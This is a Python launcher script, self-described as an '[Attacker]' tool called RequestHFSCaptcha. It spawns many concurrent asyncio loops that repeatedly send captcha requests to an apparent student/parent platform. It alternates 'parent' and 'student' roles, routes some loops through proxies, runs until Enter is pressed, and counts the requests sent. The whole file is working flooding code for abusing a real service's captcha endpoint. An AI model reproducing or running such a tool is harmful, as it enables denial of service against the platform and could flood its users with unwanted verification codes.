#-*- coding:utf-8 -*-
if __name__=="__main__":
    import sys,asyncio,logging
    #把当前目录添加到模块搜索路径
    try:
        from os import getcwd
        sys.path.append(getcwd())
        del getcwd
    except:
        pass
    #运行信息
    import Sender
    running=True

    #一直发送请求,直到running为False时退出
    async def SendLoop(Send):
        while running:
            try:
                await Send()
            except Exception as a:
                debug(a)
    #按回车退出
    def WaitForExit():
        input("[Attacker][小心误触]按回车退出\n")
        global running
        running=False
        print("[Attacker]等待Sender关闭...")

    #入口函数
    async def Main():
        print("RequestHFSCaptcha By hg56th56gd6g\n" "[Attacker]初始化中...")
        #解析命令行python Control.py <协程并发数> <几个并发使用代理> <网络timeout时间(秒)> [<是否debug>]
        count=int(sys.argv[1])
        proxy=int(sys.argv[2])
        timeout=float(sys.argv[3])
        #debug
        global debug
        debug=logging.getLogger("RequestHFSCaptcha")
        debug.addHandler(logging.StreamHandler(sys.stdout))
        if 5<=len(sys.argv) and sys.argv[4]=="True":
            debug.setLevel(logging.DEBUG)
        debug=debug.debug
        debug(str(sys.argv))
        #检查参数
        if not (1<=count and 0<=timeout and 0<=proxy<=count):
            print("参数错误")
        #学生家长对半分
        roleType=count//2

        #创建count个SendLoop,等待它们全部退出
        connects=[]
        tasks=[]
        a={"timeout":timeout,"roleType":None,"proxy":None}
        while count:
            count-=1
            #还剩使用代理的
            a["proxy"]=bool(proxy)
            if a["proxy"]:
                proxy-=1
            #还剩家长类型,并且上一个不是家长类型
            if roleType and a["roleType"]!=Sender.ROLETYPE_PARENT:
                roleType-=1
                a["roleType"]=Sender.ROLETYPE_PARENT
            #不剩家长类型了,或者上一个是家长类型
            else:
                a["roleType"]=Sender.ROLETYPE_STUDENT
            #对每个连接创建SendLoop
            connects.append(Sender.Sender(**a))
            tasks.append(asyncio.create_task(SendLoop(connects[-1].Send)))
            debug(str(a))
        #把等待退出也加入任务(新线程运行)
        tasks.append(asyncio.create_task(asyncio.to_thread(WaitForExit)))

        #清理一下变量
        del count,timeout,proxy,roleType,a
        #等待退出
        try:
            await asyncio.wait(tasks)
        finally:
            print(sum(a.count for a in connects))
            print("[Attacker]退出...")
    asyncio.run(Main())